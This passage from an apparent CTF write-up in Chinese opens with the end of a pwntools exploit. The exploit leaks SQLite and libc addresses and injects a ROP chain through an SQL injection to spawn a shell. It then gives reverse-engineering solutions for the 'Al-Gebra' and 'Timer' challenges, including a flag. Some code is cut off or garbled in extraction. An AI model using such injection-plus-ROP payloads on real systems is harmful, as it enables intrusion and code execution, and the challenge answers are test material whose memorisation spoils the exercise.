    offset = 0x2b4d80 
    ru('0') 
    buf = rn(16) 
    sqlite_base = u64(buf.decode('hex')) - offset 
    info('SQLite Base leaked = ' + hex(sqlite_base)) 
    offset2lib = 0x3c5000 
    libc = sqlite_base - offset2lib 
    system = libc + 0x46590 
    binsh = libc + 0x17C8C3 
    ropchain = '' 
    ropchain += p64(sqlite_base + 0x0000000000009ef8) 
    ropchain += p64(binsh) 
    ropchain += p64(system) 
    payload = 656 * 'a' + ropchain 
    query("a';insert into keys values (31337, 
x'"+payload.encode('hex')+"', 'exx', "+str(len(payload))+");") 
    query("exx") 
    io.interactive() 
    return 
if __name__ == '__main__': 
    pwn() 
Reverse 
Al-Gebra 
一个 pyinstaller 打包的程序。用 pyinstxtractor.py 解包，然后发现主
要文件是 pyimod04_builtins，修复文件头之后反编译，获得主程序
代码。 
主程序从服务器获取了数据和两个函数 add 和 mul。 
保存服务器发来的数据然后修复文件头反编译，得到函数内容。 
程序逻辑就是做个矩阵乘法，然后检验结果。但是这里的加法和乘
法都被重新定义过了。网上搜了下，发现这玩意好像叫多项式环。 
直接对 mul 函数进行一些测试。发现对于 mul(a,x)=b，
a> 1 
    return r 
def run(): 
    lum = [[j for j in range(0, 256)] for i in range(
0, 256)] 
    for i in range(0, 256): 
        for j in range(0, 256): 
            lum[i][mul(i, j)] = j 
    for j in xrange(len(mat[0])): 
        # print j 
        # print_mat() 
        end = length - 1 
        for i in range(j, length): 
            if end == i: 
                #print end 
                break 
            if mat[i][j] == 0: 
                swap_line(i, end) 
                end -= 1 
        # change to 1 
        for i in range(j, length): 
            if mat[i][j] == 0: 
                break 
            mul_line(i, lum[mat[i][j]][1]) 
        # print_mat() 
        # up minus all 
        for i in range(j + 1, length): 
            if mat[i][j] == 0: 
                break 
            minus_line(j, i) 
        # print_mat() 
    ans = [] 
    #print c 
    for j in range(length - 1, -1, -1): 
        xn = lum[1][c[j]] 
        ans.append(chr(xn)) 
        for i in range(j, -1, -1): 
            c[i] ^= mul(xn, mat[i][j]) 
    # print_mat() 
    print "".join(ans[::-1]) 
run() 
Timer 
逆向 so 里的函数，然后直接爆破。 
代码写炸了，得到一组结果。。然后找到一些比较像 flag 的一个个
试的 
alictf{Y0vAr3TimerMa3te7} 
#include "cstdio" 
#include "cmath" 
bool isPrime(int x){ 
    if(x 0x6F ) 
    { 
      v18 = b1 / 24867.4000000000010; 
      v31[3] = v18; 
    }else{ 
        return result; 
    } 
    v31[13] = 51; 
    v31[14] = 116; 
    v31[15] = 101; 
    v31[16] = 55; 
  } 
  else 
  { 
    return result; 
    v31[1] = 57; 
    v31[2] = 67; 
    v31[3] = -120; 
    v31[13] = 61; 
    v31[14] = 106; 
    v31[15] = 111; 
    v31[16] = 59; 
  } 
  v31[4] = v31[2] - 4; 
  v19 = b1 /31693.7999999999990; 
  v31[5] = (v19); 
  v20 = b1/19242.6600000000000; 
  v31[6] = (v20); 
  v21 = (b1/15394.1000000000000); 
  v31[7] = (v21); 
  v22 = (b1/14829.2000000000010); 
  v31[8] = (v22); 
  v23 = (b1/16003.7999999999990); 
  v31[9] = (v23); 
  v24 = (b1/14178.7999999999990); 
  v31[10] = (v24); 
  v31[11] = v29 / 20992; 
  v25 = (b1 /16663.7000000000010); 
  v26 = (v25); 
  v31[17] = 0; 
  v31[12] = v26; 
  for(int i=0;i='a' && v31[i]='A
' && v31[i]='0' && v31[i]<='9')  |
| v31[i]=='_' )){ 